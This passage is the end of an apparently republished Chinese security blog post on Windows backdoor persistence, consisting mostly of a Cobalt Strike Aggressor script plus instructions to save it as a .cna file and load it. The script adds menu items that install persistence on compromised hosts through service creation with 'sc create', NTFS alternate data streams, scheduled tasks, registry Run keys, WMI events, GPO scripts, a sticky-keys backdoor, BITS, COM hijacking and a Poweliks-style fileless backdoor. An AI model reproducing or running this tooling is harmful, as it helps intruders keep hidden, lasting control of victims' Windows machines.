});</span></code><code><span class="code-snippet_outer">          prompt_text(<span class="code-snippet__string">"Service Display Name to use?"</span>, <span class="code-snippet__string">"Generic Printer Driver Support"</span>, {</span></code><code><span class="code-snippet_outer">            $serviceDisplayName = $1;</span></code><code><span class="code-snippet_outer">          });</span></code><code><span class="code-snippet_outer">          bshell($bid, <span class="code-snippet__string">"sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \""</span>);</span></code><code><span class="code-snippet_outer">          bshell($bid, <span class="code-snippet__string">"sc start $serviceName "</span>);</span></code><code><span class="code-snippet_outer">          blog($bid, <span class="code-snippet__string">"Backdoor service created using $servicebackdoorfilename "</span>);</span></code><code><span class="code-snippet_outer">          blog($bid, <span class="code-snippet__string">"\c9[+] Backdoor creation complete!"</span>);</span></code><code><span class="code-snippet_outer">        });</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    item <span class="code-snippet__string">"Create NTFS ADS Backdoor"</span>{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span> (<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__comment"># Open a payload selection dialoge, passes it to createADSBackdoor()</span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__comment"># <span class="code-snippet__doctag">TODO:</span></span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__comment">#  * build out a proper Java Swing menu to customize the options</span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__comment">#  * Modify the powershell script to determine which key to write to HKLM || HKCU</span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1){</span></code><code><span class="code-snippet_outer">          openPayloadHelper(lambda({</span></code><code><span class="code-snippet_outer">          createADSBackdoor($bid, $1);</span></code><code><span class="code-snippet_outer">        }, $bid =&gt; $1));</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    item <span class="code-snippet__string">"&amp;计划任务启动项-持久化"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          persistUserSchtasks($bid);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;添加EXE到服务-持久化"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">if</span> (-isadmin $bid) {</span></code><code><span class="code-snippet_outer">            persistCustomService($bid);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">            berror($1, <span class="code-snippet__string">"\c4Persistence Requires Admin Level Privileges"</span>);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;注册表-持久化"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          persistRegistry($bid);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;WMI事件-PowerShell-持久化"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">if</span> (-isadmin $bid) {</span></code><code><span class="code-snippet_outer">            persistwmievent($bid);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">            berror($1, <span class="code-snippet__string">"\c4Persistence Requires Admin Level Privileges"</span>);</span></code><code><span class="code-snippet_outer">          }  </span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;WMI事件-持久化"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">if</span> (-isadmin $bid) {</span></code><code><span class="code-snippet_outer">            persistwmieventwmic($bid);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">            berror($1, <span class="code-snippet__string">"\c4Persistence Requires Admin Level Privileges"</span>);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;脚本-本地GPO-持久化"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">if</span> (-isadmin $bid) {</span></code><code><span class="code-snippet_outer">            persistStartupGPO($bid);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">            berror($1, <span class="code-snippet__string">"\c4Persistence Requires Admin Level Privileges"</span>);</span></code><code><span class="code-snippet_outer">          }</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;Stickykeys(OSK) BackDoor Persistence (Need RDP Open)"</span> {</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          stickykeys($bid);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }  </span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;Windows启动-持久化"</span>{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">          persistThroughStartUpFolder($bid);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"Bitsadmin Persistence"</span> {</span></code><code><span class="code-snippet_outer">      persistbits($1);</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"HKCU Run Key Registry PowerShell Persistence"</span> {</span></code><code><span class="code-snippet_outer">      persistRegistryPowerShell($1);</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"HKLM Run Key Registry PowerShell Persistence"</span> {</span></code><code><span class="code-snippet_outer">      persistRegistryHKLM($1);</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"Windows StartUp Folder Persistence"</span> {</span></code><code><span class="code-snippet_outer">      persistThroughStartUpFolder($1);</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"&amp;COM持久化"</span> {</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">foreach</span> $bid ($1) {</span></code><code><span class="code-snippet_outer">            Show_COM_GUI($bid);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    menu <span class="code-snippet__string">"Fileless backdoor"</span> {</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"Create fileless backdoor"</span>{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1){</span></code><code><span class="code-snippet_outer">          openPayloadHelper(lambda({</span></code><code><span class="code-snippet_outer">            createFilelessBackdoor($bid, $1);</span></code><code><span class="code-snippet_outer">            }, $bid =&gt; $1));</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"Check for fileless backdoor"</span>{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1){</span></code><code><span class="code-snippet_outer">          bpowershell_import($bid, script_resource(<span class="code-snippet__string">"scripts/Persist-Poweliks.ps1"</span>));</span></code><code><span class="code-snippet_outer">          bpowershell($bid, <span class="code-snippet__string">"Test-Poweliks"</span>);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">      item <span class="code-snippet__string">"Remove fileless backdoor"</span>{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">local</span>(<span class="code-snippet__string">'$bid'</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">foreach</span> $bid ($1){</span></code><code><span class="code-snippet_outer">          bpowershell_import($bid, script_resource(<span class="code-snippet__string">"scripts/Persist-Poweliks.ps1"</span>));</span></code><code><span class="code-snippet_outer">          bpowershell($bid, <span class="code-snippet__string">"Remove-Poweliks"</span>);</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">      }</span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><code><span class="code-snippet_outer">  }</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="font-size:15px;line-height:35px;;">将上述代码保存为xxx.cna即可让CS引入该脚本<br  /></span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: left;"><span style="font-size:15px;line-height:35px;;">效果图：</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.783303730017762" data-s="300,640" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/57_asSw2MXWia1OLykN9qzA7PE41sAjkQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgvgIwHga1lsn4MVP9aKN3OA3SaasSw2MXWia1OLykN9qzA7PE41sAjkQ/640?wx_fmt=png'" data-type="png" data-w="1126" style=""  /></p><p style="text-align: center;">当然自己还可以继续追加其他功能，欢迎一起交流</p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">来源：先知社区</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">作者：</span><span style="font-size:12px;line-height:32px;;letter-spacing: 0.544px;">By七友</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">如有侵权，请联系删除</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img data-type="gif" class="__bg_gif " data-ratio="0.5203125" data-w="640" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/58_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="visibility: visible !important;width: 640px !important;"  /></p>
                <div class="msg_source_url"><a href="https://xz.aliyun.com/t/6461">阅读原文</a></div></div>
</div>
</body>
</html>